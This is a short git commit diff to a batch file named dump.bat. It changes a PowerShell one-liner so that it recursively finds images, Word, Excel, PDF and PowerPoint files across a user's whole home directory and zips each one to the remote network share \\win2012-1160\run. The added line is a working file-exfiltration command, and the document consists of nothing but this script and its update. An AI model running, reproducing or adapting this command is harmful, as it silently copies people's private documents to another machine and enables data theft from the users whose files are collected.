d84386259229077f1116bc83ccf7390b3a76f431
d77juan <79436534+d77juan@users.noreply.github.com>
2021-06-15 11:24:08 -0700

    Update dump.bat

--- dump.bat
+++ dump.bat
@@ -1,1 +1,1 @@
-powershell  "gci $home\documents -r -i *.gif, *.jpg, *.xls*, *.doc, *.pdf, *.ppt|%{$e=[Math]::Floor([decimal](Get-Date(Get-Date).ToUniversalTime()-uformat '%s'));$r=Get-Random -Ma 10000;$o=$_.Name+[string]$e+'-'+[string]$r+'.zip';$o}"`
+powershell  "gci $home -r -i *.gif, *.jpg, *.xls*, *.doc, *.pdf, *.ppt|%{$e=[Math]::Floor([decimal](Get-Date(Get-Date).ToUniversalTime()-uformat '%s'));$r=Get-Random -Ma 10000;$o=$_.Name+[string]$e+'-'+[string]$r+'.zip';$o;Compress-Archive -pa $_.FullName -de \\win2012-1160\run\$o}"
